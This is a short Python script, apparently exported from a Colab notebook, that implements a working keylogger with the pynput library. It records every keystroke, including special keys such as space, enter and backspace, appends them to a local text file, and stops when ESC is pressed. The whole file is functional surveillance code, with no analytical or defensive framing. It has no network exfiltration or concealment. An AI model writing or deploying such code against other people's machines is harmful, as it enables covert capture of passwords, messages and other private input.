# -*- coding: utf-8 -*-
"""Untitled35.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1nCTlNnC4ric8_2JUjRffQJjdoCp98pwO
"""

from pynput.keyboard import Key, Listener

# Specify the file where the keystrokes will be logged
log_file = "key_log.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as f:
        k = str(key).replace("'", "")  # Clean key string

        # Handle special keys like space, enter, and backspace
        if k == "Key.space":
            f.write(" ")  # Log a space for "Key.space"
        elif k == "Key.enter":
            f.write("\n")  # Log a newline for "Key.enter"
        elif k == "Key.backspace":
            f.write("[BACKSPACE]")  # Log when backspace is pressed
        elif k.startswith("Key"):
            f.write(f"[{k}]")  # Log other special keys
        else:
            f.write(k)  # Log regular key presses

# Function to handle key presses
def on_press(key):
    write_to_file(key)

# Function to stop the keylogger (you can stop with ESC key)
def on_release(key):
    if key == Key.esc:
        return False

# Setup the listener to capture keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()